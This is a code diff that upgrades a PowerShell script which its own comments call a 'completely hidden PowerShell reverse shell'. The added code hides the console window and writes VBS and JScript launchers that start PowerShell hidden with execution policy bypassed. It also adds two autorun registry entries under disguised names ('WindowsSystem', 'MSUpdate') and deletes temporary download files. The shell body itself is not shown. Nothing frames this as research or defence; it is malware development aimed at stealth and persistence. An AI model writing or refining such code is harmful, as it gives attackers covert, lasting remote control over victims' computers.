@@ -1,4 +1,4 @@
-# Hide PowerShell window
+# Hide PowerShell window immediately
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -13,10 +13,11 @@ $programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $persistentPath = "C:\ProgramData\SystemShell.ps1"
 $vbsPath = Join-Path $startupPath "SystemRun.vbs"
+$wshPath = Join-Path $env:TEMP "HiddenRunner.vbs"
 
 # Save current script to ProgramData for persistence
 $currentScriptContent = @'
-# Hidden PowerShell reverse shell
+# Completely hidden PowerShell reverse shell
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -102,23 +103,38 @@ Start-ReverseShell
 # Write persistent script
 Set-Content -Path $persistentPath -Value $currentScriptContent -Force
 
-# Create VBS script for hidden startup execution
+# Create improved VBS script for completely hidden execution
 $vbsContent = @"
-Set ws = CreateObject("Wscript.Shell")
-ws.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$persistentPath""", 0, False
+Set objShell = CreateObject("WScript.Shell")
+' Run completely hidden without any window flash
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""if(1){Start-Process PowerShell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""$persistentPath\""' -WindowStyle Hidden}""", 0, False
 "@
 
 Set-Content -Path $vbsPath -Value $vbsContent -Force
 
-# Registry persistence
+# Create additional WSH script for extra hidden layer
+$wshContent = @"
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process PowerShell.exe -ArgumentList ''-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$persistentPath""'' -WindowStyle Hidden"', 0, false);
+"@
+
+Set-Content -Path $wshPath -Value $wshContent -Force
+
+# Registry persistence with hidden execution
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regName = "WindowsSystem"
-$regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
+$regValue = "wscript.exe //B `"$wshPath`""
 New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
 
-# Start the reverse shell immediately
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -WindowStyle Hidden
+# Alternative registry entry using cmd hidden
+$regName2 = "MSUpdate"
+$regValue2 = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistentPath`""
+New-ItemProperty -Path $regPath -Name $regName2 -Value $regValue2 -PropertyType String -Force | Out-Null
 
-# Remove temporary download file
-Start-Sleep -Seconds 5
+# Start completely hidden using multiple layers
+Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "`"$wshPath`"" -WindowStyle Hidden
+
+# Remove temporary download file after delay
+Start-Sleep -Seconds 10
 Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\test.ps1" -Force -ErrorAction SilentlyContinue
